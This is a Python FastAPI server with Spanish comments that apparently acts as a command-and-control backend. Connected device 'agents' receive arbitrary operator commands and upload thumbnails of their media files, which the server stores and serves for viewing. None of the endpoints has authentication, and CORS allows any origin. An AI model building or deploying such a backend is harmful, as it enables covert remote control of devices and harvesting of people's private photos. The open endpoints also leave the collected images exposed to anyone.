import json
import base64
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any

# --- INICIALIZACIÓN ---
app = FastAPI(title="Agente Control Backend (vFINAL Completo)")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, Dict[str, Any]] = {}
device_media_cache: Dict[str, Dict[str, Any]] = {}

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str = ""

class Thumbnail(BaseModel):
    filename: str
    small_thumb_b64: str
    large_thumb_b64: str

class ThumbnailChunk(BaseModel):
    thumbnails: List[Thumbnail]
    is_final_chunk: bool

# --- ENDPOINTS ---

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: '{device_name}' (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "name": device_name}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
        print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
        if device_id in connected_agents: del connected_agents[device_id]
        if device_id in device_media_cache: del device_media_cache[device_id]

# --- ¡RUTA RESTAURADA! ---
@app.get("/api/get-agents")
async def get_agents():
    """
    Devuelve una lista de todos los agentes actualmente conectados al WebSocket.
    """
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    agent = connected_agents.get(command.target_id)
    if not agent:
        return {"status": "error", "message": "Agente no conectado."}
    if command.action == "get_thumbnails":
        print(f"Limpiando caché antigua para el agente {command.target_id[:8]}.")
        device_media_cache[command.target_id] = {}
    try:
        await agent["ws"].send_text(command.json())
        return {"status": "success", "message": "Comando enviado."}
    except Exception as e:
        return {"status": "error", "message": f"Fallo al enviar comando: {e}"}

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
    if device_id not in connected_agents:
        return {"status": "error", "message": "Agente no registrado."}
    if device_id not in device_media_cache:
        device_media_cache[device_id] = {}
    for thumb in chunk.thumbnails:
        device_media_cache[device_id][thumb.filename] = thumb.dict()
    print(f"Recibido lote de {len(chunk.thumbnails)} de {device_id[:8]}. Total: {len(device_media_cache.get(device_id, {}))}")
    if chunk.is_final_chunk:
        print(f"Recepción completada para {device_id[:8]}.")
    return {"status": "chunk received"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    cache = device_media_cache.get(device_id, {})
    return [{"filename": data["filename"], "small_thumb_b64": data["small_thumb_b64"]} for data in cache.values()]

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(filename)
    if not media_item or 'large_thumb_b64' not in media_item:
        return Response(content='{"detail":"Not Found"}', status_code=404, media_type="application/json")
    try:
        image_bytes = base64.b64decode(media_item['large_thumb_b64'])
        return Response(content=image_bytes, media_type="image/jpeg")
    except Exception as e:
        return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500, media_type="application/json")
